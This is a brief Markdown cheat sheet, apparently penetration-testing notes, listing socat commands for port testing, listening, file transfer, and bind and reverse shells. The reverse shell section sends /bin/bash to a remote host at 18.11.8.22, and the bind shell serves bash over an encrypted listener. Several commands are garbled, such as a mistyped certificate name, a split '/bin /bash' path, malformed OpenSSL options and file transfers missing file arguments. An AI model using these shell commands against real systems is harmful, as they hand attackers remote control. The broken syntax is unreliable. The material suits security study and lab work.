# Socat

### Test open port

```text
socat - <protocol>:<xx.xx.xx.xx>:<port> 
e.g; socat - TCP4:192.168.1.10:80
```

### Listening on a TCP/UDP Port

`socat TCP4-LISTEN:443 STDOUT`

### Transfering file using Socat 

#### SENDER \(Listener\) 

`socat TCP4-LISTEN:443,fork`

#### RECEIVER

`socat TCP4:18.11.8.4:443,create` 

### Bind Shell 

#### LISTENER 

`socat OPENSSL-LISTEN:443,cert=bind_shett.pem,verify=e,fork EXEC:/bin /bash`

\* enabled encryption.

#### Client 

`socat - OPENSSL::,verify=8`

### Reverse Shell 

#### LISTENER 

`socat -d -d TCP4-LISTEN:443 STDOUT`

#### Client \(Send Reverse shell\) 

`socat TCP4:18.11.8.22:443 EXEC:/bin/bash`

